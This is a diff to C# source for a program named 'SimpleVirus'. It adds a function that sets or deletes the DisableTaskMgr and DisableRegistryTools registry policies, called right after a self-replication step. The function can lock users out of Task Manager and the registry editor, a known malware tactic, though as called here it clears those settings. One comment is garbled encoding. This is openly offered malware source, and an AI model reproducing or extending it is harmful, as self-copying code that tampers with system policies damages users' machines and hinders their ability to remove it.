@@ -1,3 +1,4 @@
+using Microsoft.Win32;
 using System.Diagnostics;
 using System.Security.Principal;
 
@@ -32,6 +33,9 @@ namespace SimpleVirus
             if (Application.StartupPath != workDir)
             {
                 SelfReplication(workDir);
+
+                SetPoliciesSetting(PoliciesSetting.TaskManager, true);
+                SetPoliciesSetting(PoliciesSetting.RegistryTools, true);
             }
         }
 
@@ -97,6 +101,27 @@ namespace SimpleVirus
                     CopyDirectory(subDir.FullName, newDestinationDir, true);
                 }
             }
+        }
+
+        public enum PoliciesSetting
+        {
+            TaskManager,
+            RegistryTools
+        };
+
+        private static void SetPoliciesSetting(PoliciesSetting setting, bool enable)
+        {
+            const string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
+            string keyValue = (setting == PoliciesSetting.TaskManager) ? "DisableTaskMgr" : "DisableRegistryTools";
+
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath);
+
+            if (enable && objRegistryKey.GetValue(keyValue) != null)
+                objRegistryKey.DeleteValue(keyValue); // ≈∞ ªË¡¶ 
+            else if (!enable)
+                objRegistryKey.SetValue(keyValue, 1, RegistryValueKind.DWord);
+
+            objRegistryKey.Close();
         }
 
         /// <summary>
